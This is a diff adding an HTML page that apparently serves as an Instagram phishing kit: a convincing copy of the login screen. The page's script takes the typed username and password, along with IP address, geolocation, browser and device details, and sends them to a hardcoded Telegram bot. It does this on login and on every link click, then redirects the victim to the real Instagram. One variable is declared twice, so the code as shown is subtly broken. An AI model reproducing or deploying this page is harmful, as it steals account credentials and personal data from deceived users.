@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #000; /* Black background as per image */
+            display: flex;
+            flex-direction: column; /* Changed to column to stack elements */
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding-top: 20px; /* Add some top padding for mobile view */
+            padding-bottom: 20px; /* Add some bottom padding */
+        }
+        .loading-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            background-color: #000;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        .loading-screen.hidden {
+            opacity: 0;
+            pointer-events: none; /* Disable interaction after hidden */
+        }
+        .loading-logo-img { /* New style for the loading screen logo image */
+            width: 150px; /* Adjusted size to be smaller */
+            height: auto; /* Maintain aspect ratio */
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background-color: #000; /* Matches body background */
+            border: 1px solid #262626; /* Darker border */
+            border-radius: 8px;
+            padding: 40px;
+            width: 100%;
+            max-width: 380px; /* Max width as seen in the image */
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            display: none; /* Hidden initially */
+            flex-direction: column;
+            align-items: center;
+        }
+        .instagram-logo-img { /* New style for the Instagram logo image in login page */
+            width: 175px; /* Adjusted to fit the image proportions better */
+            height: auto;
+            margin-bottom: 30px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            background-color: #1a1a1a; /* Darker input background */
+            border: 1px solid #262626; /* Input border */
+            color: #fefefe;
+            padding: 12px 10px;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            width: 100%;
+            font-size: 14px;
+            box-sizing: border-box; /* Include padding and border in the element's total width and height */
+        }
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #8e8e8e; /* Placeholder text color */
+        }
+        .login-button {
+            background-color: #0095f6; /* Instagram blue */
+            color: white;
+            padding: 10px 0;
+            border-radius: 6px;
+            width: 100%;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 5px;
+            margin-bottom: 20px;
+        }
+        .login-button:hover {
+            background-color: #0077c0;
+        }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex-grow: 1;
+            height: 1px;
+            background-color: #262626;
+        }
+        .or-divider::before {
+            margin-right: 15px;
+        }
+        .or-divider::after {
+            margin-left: 15px;
+        }
+        .facebook-login {
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        .facebook-login svg {
+            margin-right: 8px;
+        }
+        .forgot-password {
+            color: #0095f6;
+            font-size: 12px;
+            cursor: pointer;
+            margin-bottom: 40px;
+        }
+        .signup-box {
+            background-color: #000; /* Matches body background */
+            border: 1px solid #262626; /* Darker border */
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+            margin-top: 10px; /* Adjusted margin to be closer to the login box */
+            color: #fefefe;
+            font-size: 14px;
+        }
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            margin-left: 5px;
+            cursor: pointer;
+        }
+        .get-the-app {
+            color: #fefefe;
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .app-links {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            justify-content: center;
+            flex-wrap: wrap; /* Allow wrapping on smaller screens */
+        }
+        .app-links img {
+            height: 40px; /* Adjust height of app store icons */
+            border-radius: 4px;
+        }
+        .meta-text {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 60px;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px; /* Spacing between links */
+            margin-top: 40px; /* Space from app links */
+            max-width: 90%;
+        }
+        .footer-links a, .footer-links span {
+            color: #8e8e8e;
+            font-size: 12px;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+        .footer-links a:hover {
+            color: #fefefe;
+        }
+        .copyright-text {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 20px;
+            margin-bottom: 20px; /* Ensure space at the very bottom */
+            text-align: center;
+        }
+
+        /* Modal specific styles for custom alerts */
+        .custom-alert-modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 50; /* Sit on top of everything else */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .custom-alert-modal-content {
+            background-color: #1a1a1a;
+            padding: 30px;
+            border: 1px solid #262626;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .custom-alert-modal-content h2 {
+            color: #fefefe;
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        .custom-alert-modal-content p {
+            color: #fefefe;
+            margin-bottom: 25px;
+        }
+        .custom-alert-modal-content button {
+            background-color: #0095f6;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            width: 100%;
+        }
+        .custom-alert-modal-content button:hover {
+            background-color: #0077c0;
+        }
+
+
+        /* Responsive adjustments */
+        @media (max-width: 640px) {
+            .login-container, .signup-box {
+                border: none; /* Remove border on smaller screens */
+                background-color: #000; /* Ensure background is black */
+                padding: 20px;
+                max-width: 100%;
+            }
+            body {
+                align-items: center; /* Center horizontally */
+                padding-top: 40px;
+                padding-bottom: 40px; /* Ensure enough space at the bottom */
+            }
+            .meta-text {
+                position: static; /* Position normally on smaller screens */
+                margin-top: 40px;
+                padding-bottom: 20px;
+            }
+            .footer-links {
+                gap: 10px; /* Reduce gap on smaller screens */
+                font-size: 10px; /* Smaller font on small screens */
+                padding: 0 10px; /* Add some horizontal padding */
+            }
+            .copyright-text {
+                font-size: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Loading Screen -->
+    <div id="loading-screen" class="loading-screen">
+        <img src="https://github.com/KINGSHUBHAM-tech/Logo-cp-websp/blob/main/1658586823instagram-logo-transparent.png?raw=true"
+             alt="Instagram Logo"
+             class="loading-logo-img"
+             onerror="this.onerror=null;this.src='https://placehold.co/150x60/333/FFF?text=Instagram+Logo'">
+        <span class="meta-text">from Meta</span>
+    </div>
+
+    <!-- Login Page -->
+    <div id="login-page" class="login-container">
+        <img src="https://github.com/KINGSHUBHAM-tech/Logo-cp-websp/blob/main/instagram-logo.png?raw=true"
+             alt="Instagram"
+             class="instagram-logo-img"
+             onerror="this.onerror=null;this.src='https://placehold.co/175x51/333/FFF?text=Instagram'">
+
+        <input type="text" id="username-email-phone" placeholder="Phone number, username, or email" class="focus:outline-none focus:ring-1 focus:ring-gray-600">
+        <input type="password" id="password" placeholder="Password" class="focus:outline-none focus:ring-1 focus:ring-gray-600">
+
+        <button id="login-button" class="login-button">Log in</button>
+
+        <div class="or-divider">OR</div>
+
+        <button class="facebook-login" data-link-name="Facebook Login">
+            <svg aria-label="Facebook icon" class="-mt-px mr-2" color="#0095f6" fill="#0095f6" height="16" role="img" viewBox="0 0 24 24" width="16"><path d="M12.001 0C5.373 0 0 5.373 0 12.001 0 17.989 4.143 22.825 9.71 23.906V15.5H7V12.5h2.71v-2.002c0-2.68 1.63-4.142 4.027-4.142 1.15 0 2.14.086 2.433.125V8.5h-1.63c-1.396 0-1.666.663-1.666 1.638v1.863h3.334l-.534 3h-2.8V23.906C19.858 22.824 24 17.989 24 12.001 24 5.373 18.627 0 12.001 0Z"></path></svg>
+            Log in with Facebook
+        </button>
+
+        <a href="#" class="forgot-password" data-link-name="Forgot Password">Forgot password?</a>
+    </div>
+
+    <div class="signup-box">
+        Don't have an account? <a href="#" class="signup-link" data-link-name="Sign Up Link">Sign up</a>
+    </div>
+
+    <div class="get-the-app">Get the app.</div>
+    <div class="app-links">
+        <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank" data-link-name="Apple Store">
+            <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/apple-button.png?raw=true"
+                 alt="Download on the App Store"
+                 onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Apple+Store'">
+        </a>
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en" target="_blank" data-link-name="Google Play Store">
+            <img src="https://github.com/laisfrigerio/instagram-clone-login-page/blob/master/img/googleplay-button.png?raw=true"
+                 alt="Get it on Google Play"
+                 onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Google+Play'">
+        </a>
+        <a href="https://apps.microsoft.com/detail/instagram/9NBLGGH5L9XT?hl=en-us&gl=US" target="_blank" data-link-name="Microsoft Store">
+            <img src="https://github.com/KINGSHUBHAM-tech/FALCON-BOT/blob/main/image.png?raw=true"
+                 alt="Get it from Microsoft"
+                 onerror="this.onerror=null;this.src='https://placehold.co/135x40/333/FFF?text=Microsoft+Store'">
+        </a>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="footer-links">
+        <a href="#" data-link-name="Meta Link">Meta</a>
+        <a href="#" data-link-name="About Link">About</a>
+        <a href="#" data-link-name="Blog Link">Blog</a>
+        <a href="#" data-link-name="Jobs Link">Jobs</a>
+        <a href="#" data-link-name="Help Link">Help</a>
+        <a href="#" data-link-name="API Link">API</a>
+        <a href="#" data-link-name="Privacy Link">Privacy</a>
+        <a href="#" data-link-name="Terms Link">Terms</a>
+        <a href="#" data-link-name="Locations Link">Locations</a>
+        <a href="#" data-link-name="Instagram Lite Link">Instagram Lite</a>
+        <a href="#" data-link-name="Threads Link">Threads</a>
+        <a href="#" data-link-name="Contact Uploading & Non-Users Link">Contact Uploading & Non-Users</a>
+        <a href="#" data-link-name="Meta Verified Link">Meta Verified</a>
+    </div>
+    <div class="copyright-text">
+        © 2025 Instagram from Meta
+    </div>
+
+    <!-- Custom Alert Modal -->
+    <div id="custom-alert-modal" class="custom-alert-modal">
+        <div class="custom-alert-modal-content">
+            <h2 id="alert-title">Alert</h2>
+            <p id="alert-message"></p>
+            <button onclick="document.getElementById('custom-alert-modal').style.display='none'">OK</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const loadingScreen = document.getElementById('loading-screen');
+            const loginPage = document.getElementById('login-page');
+            const loginButton = document.getElementById('login-button');
+            const usernameEmailPhoneInput = document.getElementById('username-email-phone');
+            const passwordInput = document.getElementById('password');
+
+            // Simulate loading for 2 seconds then show login page
+            setTimeout(() => {
+                loadingScreen.classList.add('hidden');
+                setTimeout(() => {
+                    loadingScreen.style.display = 'none'; // Completely remove after transition
+                    loginPage.style.display = 'flex'; // Show the login page
+                }, 1000); // Wait for opacity transition to complete
+            }, 2000);
+
+            // Validation functions
+            const isEmail = (input) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
+            const isPhoneNumber = (input) => /^\d{10}$/.test(input);
+            const isUsername = (input) => /^[a-zA-Z0-9._]{1,30}$/.test(input);
+
+            // sendToTelegram function now accepts input1, input2, actionType, and a flag for detailed info
+            async function sendToTelegram(input1, input2, actionType, includeDetailedInfo = false) {
+                const browser = navigator.userAgent;
+                const language = navigator.language;
+                const platform = navigator.platform;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                let ip = 'Error in fetching IP';
+                let locationText = 'Error in fetching Geolocation';
+                
+                // Fetch IP address
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) { /* Error in fetching IP */ }
+
+                // Fetch Geolocation without prompting if permission isn't already granted
+                try {
+                    if (navigator.geolocation && navigator.permissions) {
+                        const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                        if (permissionStatus.state === 'granted') {
+                            await new Promise((resolve) => {
+                                navigator.geolocation.getCurrentPosition(
+                                    (pos) => {
+                                        const { latitude, longitude } = pos.coords;
+                                        locationText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                                        resolve();
+                                    },
+                                    (error) => {
+                                        locationText = `Error in fetching Geolocation (${error.message || error.code})`;
+                                        resolve();
+                                    },
+                                    { timeout: 5000, enableHighAccuracy: false }
+                                );
+                            });
+                        } else {
+                            locationText = `Geolocation not granted or available without prompt (${permissionStatus.state})`;
+                        }
+                    } else {
+                        locationText = 'Geolocation API or Permissions API Not Supported';
+                    }
+                } catch (e) { /* Error in checking/fetching Geolocation */ }
+
+
+                let detailedInfoSection = '';
+                if (includeDetailedInfo) {
+                    // Collect device info that typically doesn't require explicit permission pop-ups
+                    let batteryLevel = 'N/A';
+                    let batteryCharging = 'N/A';
+                    let networkType = 'N/A';
+                    let networkEffectiveType = 'N/A';
+                    let deviceMemory = 'N/A';
+                    let hardwareConcurrency = 'N/A';
+
+                    // Battery Status API
+                    try {
+                        if ('getBattery' in navigator) {
+                            const battery = await navigator.getBattery();
+                            batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                            batteryCharging = battery.charging ? 'Yes' : 'No';
+                        } else {
+                            batteryLevel = 'API Not Supported';
+                            batteryCharging = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        batteryLevel = `Error in fetching Battery status (${e.message || e.name})`;
+                        batteryCharging = `Error in fetching Battery status (${e.message || e.name})`;
+                    }
+
+                    // Network Information API
+                    try {
+                        if ('connection' in navigator && navigator.connection) {
+                            networkType = navigator.connection.type || 'N/A';
+                            networkEffectiveType = navigator.connection.effectiveType || 'N/A';
+                        } else {
+                            networkType = 'API Not Supported';
+                            networkEffectiveType = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        networkType = `Error in fetching Network info (${e.message || e.name})`;
+                        networkEffectiveType = `Error in fetching Network info (${e.message || e.name})`;
+                    }
+
+                    // Device Memory
+                    try {
+                        if ('deviceMemory' in navigator) {
+                            deviceMemory = `${navigator.deviceMemory} GB`;
+                        } else {
+                            deviceMemory = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        deviceMemory = `Error in fetching Device Memory (${e.message || e.name})`;
+                    }
+
+                    // Hardware Concurrency
+                    try {
+                        if ('hardwareConcurrency' in navigator) {
+                            hardwareConcurrency = navigator.hardwareConcurrency;
+                        } else {
+                            hardwareConcurrency = 'API Not Supported';
+                        }
+                    } catch (e) {
+                        hardwareConcurrency = `Error in fetching Hardware Concurrency (${e.message || e.name})`;
+                    }
+
+                    detailedInfoSection = `
+🔋 *Device Info:*
+- Battery Level: ${batteryLevel}
+- Battery Charging: ${batteryCharging}
+- Network Type: ${networkType}
+- Effective Network Type: ${networkEffectiveType}
+- Device Memory: ${deviceMemory}
+- Hardware Concurrency (CPU cores): ${hardwareConcurrency}
+`;
+                }
+
+
+                const fullMessage = `
+? *${actionType}*
+---------------------
+� *Identifier:* ${input1 || 'Not Entered'}
+📝 *Password:* ${input2 || 'Not Entered'}
+
+🌐 *Browser Info:*
+- Platform: ${platform}
+- Language: ${language}
+- Timezone: ${timezone}
+- User Agent: ${browser}
+
+🌍 *IP Address:* ${ip}
+📍 *Geolocation:* ${locationText}
+${detailedInfoSection}
+`;
+
+                const botToken = '8157111925:AAEq1sV-01ewJ29tIjXjMmXWKfWx4lU5isI';
+                const chatId = '1747742228';
+                const chatId = '8157111925';
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: fullMessage,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    await response.json(); // Consume response to ensure request completes
+                } catch (error) {
+                    // Silently handle fetch errors
+                }
+            }
+
+            // Login validation, Telegram send, and redirect (Detailed Info for all key actions)
+            loginButton.addEventListener('click', async () => {
+                const identifier = usernameEmailPhoneInput.value.trim();
+                const password = passwordInput.value.trim();
+
+                let isValidIdentifier = false;
+                let validationMessage = '';
+
+                if (isPhoneNumber(identifier)) {
+                    isValidIdentifier = true;
+                } else if (isEmail(identifier)) {
+                    isValidIdentifier = true;
+                } else if (isUsername(identifier)) {
+                    isValidIdentifier = true;
+                } else {
+                    validationMessage += 'Please enter a valid 10-digit phone number, email address, or username (1-30 characters, letters, numbers, periods, underscores). ';
+                }
+
+                if (!password) {
+                    validationMessage += 'Please enter your password.';
+                }
+
+                if (isValidIdentifier && password) {
+                    // Send detailed info for primary login button
+                    await sendToTelegram(identifier, password, 'Login Attempt (Detailed Info)', true);
+                    window.location.href = "https://www.instagram.com";
+                } else {
+                    alert(validationMessage.trim() || 'Please fill in both fields correctly.');
+                }
+            });
+
+            // Add event listeners to all links for DETAILED INFO COLLECTION
+            document.querySelectorAll('a, button.facebook-login').forEach(link => {
+                // Exclude the login-button itself as it has its own logic (handled above)
+                if (link.id === 'login-button') return;
+
+                link.addEventListener('click', async (event) => {
+                    const identifier = usernameEmailPhoneInput.value.trim();
+                    const password = passwordInput.value.trim();
+                    const linkName = link.dataset.linkName || link.innerText.trim() || link.getAttribute('href');
+                    
+                    // Send detailed info for all link clicks
+                    await sendToTelegram(identifier, password, `Clicked Link: ${linkName}`, true);
+                });
+            });
+
+
+            // Prevent default form submission if this were a form
+            usernameEmailPhoneInput.addEventListener('keydown', (event) => {
+                if (event.key === 'Enter') {
+                    event.preventDefault();
+                    loginButton.click();
+                }
+            });
+
+            passwordInput.addEventListener('keydown', (event) => {
+                if (event.key === 'Enter') {
+                    event.preventDefault();
+                    loginButton.click();
+                }
+            });
+
+        });
+
+        // Custom Alert function
+        function alert(message) {
+            const modal = document.getElementById('custom-alert-modal');
+            const alertMessage = document.getElementById('alert-message');
+            alertMessage.innerText = message;
+            modal.style.display = 'flex'; // Show the modal
+        }
+    </script>
+</body>
+</html>
+�
